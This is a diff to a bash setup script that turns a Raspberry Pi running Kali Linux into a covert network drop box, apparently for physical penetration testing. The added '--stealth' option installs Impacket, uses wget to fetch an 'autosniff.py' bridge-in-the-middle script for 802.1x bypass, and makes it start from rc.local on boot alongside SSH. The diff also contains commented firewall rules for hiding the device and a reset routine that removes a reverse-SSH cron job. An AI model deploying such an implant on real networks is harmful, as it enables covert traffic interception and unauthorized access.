@@ -20,6 +20,8 @@
 #   --wifi    = Configure wifi AP to start on boot            #
 #   --ssh     = Configure ssh phone home over 				  #
 #					ssh/http/https/DNS                     	  #
+#   --stealth = 802.1x Bypass and Stealth (includes wifi)     #
+#   --reset   = Reset device                                  #
 #   e.g. # bash raspi-config.sh --ssh --wifi                  #
 #                             ---                             #
 #                                                             #
@@ -57,6 +59,8 @@ TFTinstall=false             # Do not install TFT patched kernel             [ -
 Expand=false                 # Do not expand image to fill SD card           [ --expand ]
 ConfigSSH=false				 # Do not config SSH 							 [ --ssh ]
 ConfigWifi=false			 # Do not config Wifi 							 [ --wifi ]
+Stealth=false                # Do not config stealth mode                    [ --stealth ]
+ResetDevice=false            # Do not reset device                           [ --reset ]
 
 ##### (Cosmetic) Colour output
 RED="\033[01;31m"      # Issues/Errors
@@ -80,6 +84,11 @@ for x in $( tr '[:upper:]' '[:lower:]' <<< "$@" ); do
     ConfigSSH=true
   elif [ "${x}" == "--wifi" ]; then
     ConfigWifi=true
+  elif [ "${x}" == "--stealth" ]; then
+    ConfigWifi=true
+    Stealth=true
+  elif [ "${x}" == "--reset" ]; then
+    ResetDevice=true
   else
     echo -e ' '${RED}'[!]'${RESET}" Unknown option: ${RED}${x}${RESET}" 1>&2
     exit 1
@@ -156,7 +165,15 @@ systemctl set-default multi-user.target
 ##### Update Raspberry Pi
 echo -e "\n ${GREEN}[+]${RESET} Updating ${GREEN}Raspberry Pi${RESET}"
 apt-get update && apt-get install kali-linux-full && apt-get -y upgrade && apt-get -y dist-upgrade
-apt-get install -y screen tmux hostapd dnsmasq wireless-tools iw wvdial resolvconf bridge-utils ebtables iptables arptables isc-dhcp-server autossh httptunnel
+apt-get install -y screen tmux hostapd dnsmasq wireless-tools iw wvdial resolvconf bridge-utils ebtables iptables arptables isc-dhcp-server autossh httptunnel python-crypto python python-impacket python-pcapy libpcap0.8 macchanger git openssh-server
+
+##### Installing Impacket
+cd ~
+git clone https://github.com/c0d3z3r0/impacket.git
+cd impacket/ && python setup.py install
+cd ~
+
+
 fi
 
 
@@ -700,3 +717,85 @@ EOF
 
 fi
 
+
+##### Reset Raspberry Pi
+if [ "${Stealth}" != "false" ]; then
+   echo -e "\n ${GREEN}[+]${RESET} Creating stealth mode"
+# sudo iptables -F
+# sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+# sudo iptables -A INPUT -d 10.0.0.0/8 -j ACCEPT
+# sudo iptables -A INPUT -d 172.16.0.0/12 -j ACCEPT
+# sudo iptables -A INPUT -d 192.168.0.0/16 -j ACCEPT
+# sudo iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
+# sudo iptables -A OUTPUT -d 172.16.0.0/12 -j ACCEPT
+# sudo iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT
+# sudo iptables -P INPUT ACCEPT
+# sudo ip6tables -P INPUT ACCEPT
+# sudo iptables -P OUTPUT DROP
+# sudo ip6tables -P OUTPUT DROP
+
+
+wget https://raw.githubusercontent.com/jkadijk/BitM/master/autosniff.py -O /root/autosniff.py
+
+cat <<EOF > "/etc/rc.local"
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+
+sh /root/config_ap.sh
+cd /root/ && python /root/autosniff.py &
+/etc/init.d/ssh start &
+
+exit 0
+
+EOF
+
+fi
+
+
+##### Reset Raspberry Pi
+if [ "${ResetDevice}" != "false" ]; then
+   echo -e "\n ${GREEN}[+]${RESET} Reseting Raspberry Pi Configs"
+   echo -e "\n ${YELLOW}[i]${RESET} Flushing Firewall"
+    iptables -F
+    iptables -X
+    iptables -t nat -F
+    iptables -t nat -X
+    iptables -t mangle -F
+    iptables -t mangle -X
+    iptables -P INPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -P OUTPUT ACCEPT
+
+   echo -e "\n ${YELLOW}[i]${RESET} Removing CRON Jobs"
+   rm /etc/cron.d/revssh
+
+   echo -e "\n ${YELLOW}[i]${RESET} Reseting rc.local"
+cat <<EOF > "/etc/rc.local"
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+
+exit 0
+
+EOF
+
+fi
